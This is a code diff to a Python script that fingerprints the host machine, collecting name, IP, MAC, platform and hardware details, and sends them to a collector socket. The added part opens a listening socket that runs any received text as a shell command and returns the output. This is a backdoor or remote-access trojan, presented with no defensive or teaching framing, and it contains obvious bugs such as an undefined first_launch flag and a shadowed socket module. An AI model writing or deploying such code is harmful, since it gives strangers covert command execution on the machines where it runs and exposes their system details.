@@ -4,13 +4,15 @@ import psutil
 import uuid
 import os
 import socket
-
+import time
 # get the basic information of the software
 report = open("report.txt", "w+")
 
 id = open("id.txt", "a+")
 if os.stat("id.txt").st_size == 0:
     id.write(str(uuid.uuid4()))
+else:
+    first_launch = False
 
 platform = plat.platform()
 system = plat.system()
@@ -77,12 +79,39 @@ report.close()
 
 HOST = "127.0.0.1"
 PORT = 5566
+if first_launch:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        id_file = open("id.txt")
+        id = id_file.read()
+        req = cur = f"('{id}', '{computer_name}', '{ip_addr}', '{mac_addr}', '{platform}', '{system}', '{ver}', '{bits}', '{totcore}', '{maxfreq}', '{minfreq}', {ram_in_MB}, '{broadcast_ip}', '{netmask}', '{BROADCAST_MAC}');".encode()
+        print(req)
+        s.send(req)
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((HOST, PORT))
-    id_file = open("id.txt")
-    id = id_file.read()
-    req = cur = f"INSERT INTO users (ID, MACHINE_NAME, IP, MAC_ADDR, PLATFORM, SYS, VER_SYS, BITS_SYS, TOTCORE, MAXFREQ, MINFREQ, RAMTOT, BROADCOAST_IP, NETMASK, BROADCAST_MAC) values ('{id}', '{computer_name}', '{ip_addr}', '{mac_addr}', '{platform}', '{system}', '{ver}', '{bits}', '{totcore}', '{maxfreq}', '{minfreq}', {ram_in_MB}, '{broadcast_ip}', '{netmask}', '{BROADCAST_MAC}');".encode()
-    print(req)
-    s.send(req)
 
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+socket.bind((ip_addr, 5566))
+socket.listen(5)
+client, address = socket.accept()
+print("{} connected".format(address))
+while True:
+
+    sended = client.recv(255)
+
+    cmd = sended.decode()
+    if cmd == b'':
+        time.sleep(10)
+    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, )
+
+    stdout, stderr = process.communicate()
+    if stderr is None:
+        stderr = ""
+    print(stdout, stderr)
+    try:
+        client.sendall(stdout)
+    except:
+        client.sendall(stderr)
+    finally:
+        client.sendall(str.encode("Command has returned any output"))
+
+    pass
